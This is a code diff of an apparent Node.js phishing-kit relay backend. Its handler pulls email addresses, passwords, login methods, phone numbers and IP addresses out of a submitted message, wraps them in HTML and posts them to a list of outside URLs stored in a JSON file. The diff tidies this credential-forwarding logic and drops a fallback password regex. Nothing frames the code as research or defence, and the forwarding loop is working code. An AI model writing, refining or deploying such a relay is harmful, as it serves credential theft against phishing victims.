@@ -4,21 +4,17 @@ const path = require("path");
 const FILE = path.join(process.cwd(), "data", "urls.json");
 
 /* ======================
-   SAFE LOAD & SAVE URL (FIX 500)
+   SAFE LOAD URL
 ====================== */
 function loadUrls() {
   try {
     if (!fs.existsSync(FILE)) return [];
-    const data = fs.readFileSync(FILE, "utf8");
 
+    const data = fs.readFileSync(FILE, "utf8");
     if (!data) return [];
 
-    try {
-      return JSON.parse(data);
-    } catch (e) {
-      console.log("JSON ERROR:", e.message);
-      return [];
-    }
+    const parsed = JSON.parse(data);
+    return Array.isArray(parsed) ? parsed : [];
 
   } catch (err) {
     console.log("LOAD ERROR:", err.message);
@@ -26,26 +22,18 @@ function loadUrls() {
   }
 }
 
-function saveUrls(data) {
-  try {
-    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
-  } catch (e) {
-    console.log("SAVE ERROR:", e.message);
-  }
-}
-
 /* ======================
    NORMALIZE KEY
 ====================== */
 function normalizeKey(key = "") {
-  key = key.toLowerCase();
+  key = String(key).toLowerCase();
 
   const map = {
     email: ["email", "e-mail", "mail"],
     password: ["password", "pass", "kata sandi", "sandi", "pwd"],
     user: ["user", "username", "nama", "name"],
-    login: ["login", "login via", "auth"],
-    phone: ["phone", "hp", "no hp", "nomor", "telepon"],
+    login: ["login", "auth"],
+    phone: ["phone", "hp", "telepon", "nomor"],
     ip: ["ip", "ip address"],
   };
 
@@ -77,11 +65,8 @@ function extractVars(input = "") {
   let m;
 
   while ((m = tdRegex.exec(html)) !== null) {
-    const keyRaw = m[1].replace(/<[^>]*>/g, "").trim();
-    const value = m[2].replace(/<[^>]*>/g, "").trim();
-
-    const key = normalizeKey(keyRaw);
-
+    const key = normalizeKey(m[1]);
+    const value = String(m[2]).replace(/<[^>]*>/g, "").trim();
     if (value) vars[key] = value;
   }
 
@@ -92,23 +77,17 @@ function extractVars(input = "") {
     const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);
 
     if (m2) {
-      const key = normalizeKey(m2[1].trim());
+      const key = normalizeKey(m2[1]);
       const value = m2[2].trim();
-
       if (value) vars[key] = value;
     }
-  }
-
-  if (!vars.password) {
-    const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
-    if (passMatch) vars.password = passMatch[2];
   }
 
   return vars;
 }
 
 /* ======================
-   BUILD HTML
+   BUILD HTML (RESTORED)
 ====================== */
 function buildHtml(vars) {
   return `
@@ -147,52 +126,48 @@ function buildHtml(vars) {
 }
 
 /* ======================
-   🔥 ANTI SPAM (SUBJEK + PESAN ONLY)
+   ANTI SPAM (SUBJEK + PESAN)
 ====================== */
 function containsSpamPattern(text = "") {
   const t = String(text).toLowerCase();
 
-  const spamPatterns = [
+  const patterns = [
     /free\s+money/,
-    /klik\s+di\s+sini/i,
-    /wa\s*me/i,
-    /http[s]?:\/\//gi,
-    /bit\.ly|tinyurl|cutt\.ly/i,
+    /klik\s+di\s+sini/,
+    /wa\s*me/,
+    /http/,
+    /bit\.ly|tinyurl|cutt\.ly/,
     /(.)\1{6,}/,
-    /buy\s+now|order\s+now/i,
-    /pinjaman|kredit\s+cepat/i,
-    /xxx|porn|sex/i
+    /buy\s+now|order\s+now/,
+    /pinjaman|kredit\s+cepat/,
+    /xxx|porn|sex/
   ];
 
-  return spamPatterns.some((p) => p.test(t));
+  return patterns.some(p => p.test(t));
 }
 
 function spamScore(text = "") {
+  const t = String(text);
   let score = 0;
-  const t = String(text).toLowerCase();
 
   if (t.includes("http")) score += 2;
   if (/(.)\1{5,}/.test(t)) score += 2;
   if (t.length > 2000) score += 1;
-  if (/[A-Z]{10,}/.test(text)) score += 1;
+  if (/[A-Z]{10,}/.test(t)) score += 1;
 
   return score;
 }
 
 /* ======================
-   FETCH SAFE (FIX 500)
+   SAFE FETCH
 ====================== */
-let fetchFn;
+const fetchFn =
+  global.fetch ||
+  (() => null);
 
-try {
-  fetchFn = global.fetch || require("node-fetch");
-} catch (e) {
-  fetchFn = null;
-}
-
-const Controller =
+const AbortCtrl =
   global.AbortController ||
-  (typeof require !== "undefined" ? require("abort-controller") : null);
+  (() => null);
 
 /* ======================
    MAIN HANDLER
@@ -200,15 +175,28 @@ const Controller =
 module.exports = async (req, res) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({ success: false, message: "POST only" });
+      return res.status(405).json({
+        success: false,
+        message: "POST only"
+      });
     }
 
     const body = req.body || {};
-    const subjek = body.subjek || "";
-    const pesan = body.pesan || "";
+    const subjek = String(body.subjek || "");
+    const pesan = String(body.pesan || "");
 
     /* ======================
-       ANTI SPAM CHECK (ONLY SUBJEK & PESAN)
+       VALIDASI WAJIB
+    ====================== */
+    if (!subjek || !pesan) {
+      return res.status(400).json({
+        success: false,
+        message: "subjek & pesan wajib diisi"
+      });
+    }
+
+    /* ======================
+       ANTI SPAM
     ====================== */
     if (containsSpamPattern(subjek) || spamScore(subjek) >= 2) {
       return res.status(400).json({
@@ -227,7 +215,6 @@ module.exports = async (req, res) => {
     const vars = extractVars(pesan);
 
     vars.ip =
-      vars.ip ||
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket?.remoteAddress ||
       "unknown";
@@ -236,57 +223,52 @@ module.exports = async (req, res) => {
 
     const urls = loadUrls();
 
-    if (!Array.isArray(urls) || urls.length === 0) {
-      return res.json({ success: false, message: "URL kosong" });
+    if (!urls.length) {
+      return res.json({
+        success: false,
+        message: "URL kosong"
+      });
     }
 
     /* ======================
-       SAFE PARALLEL REQUEST
+       SAFE REQUEST
     ====================== */
     const results = await Promise.allSettled(
       urls.map(async (url) => {
-        let attempt = 0;
+        try {
+          if (!fetchFn) throw new Error("fetch not available");
 
-        while (attempt < 2) {
-          attempt++;
+          const controller = AbortCtrl ? new AbortCtrl() : null;
+          const timeout = controller
+            ? setTimeout(() => controller.abort(), 8000)
+            : null;
 
-          try {
-            const controller = Controller ? new Controller() : null;
-            const timeout = controller
-              ? setTimeout(() => controller.abort(), 8000)
-              : null;
+          const r = await fetchFn(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+              subjek,
+              pesan: html
+            }),
+            signal: controller?.signal
+          });
 
-            if (!fetchFn) throw new Error("Fetch not available");
+          if (timeout) clearTimeout(timeout);
 
-            const r = await fetchFn(url, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: new URLSearchParams({
-                subjek,
-                pesan: html
-              }),
-              signal: controller?.signal
-            });
+          return {
+            url,
+            success: true,
+            status: r.status
+          };
 
-            if (timeout) clearTimeout(timeout);
-
-            return {
-              url,
-              success: true,
-              status: r.status
-            };
-
-          } catch (err) {
-            if (attempt >= 2) {
-              return {
-                url,
-                success: false,
-                error: err?.message || "UNKNOWN_ERROR"
-              };
-            }
-          }
+        } catch (err) {
+          return {
+            url,
+            success: false,
+            error: err.message
+          };
         }
       })
     );
@@ -303,8 +285,8 @@ module.exports = async (req, res) => {
 
     return res.status(500).json({
       success: false,
-      message: "internal error (fixed safe mode)",
-      error: err?.message || "UNKNOWN"
+      message: "internal error safe mode",
+      error: err.message || "UNKNOWN"
     });
   }
 };
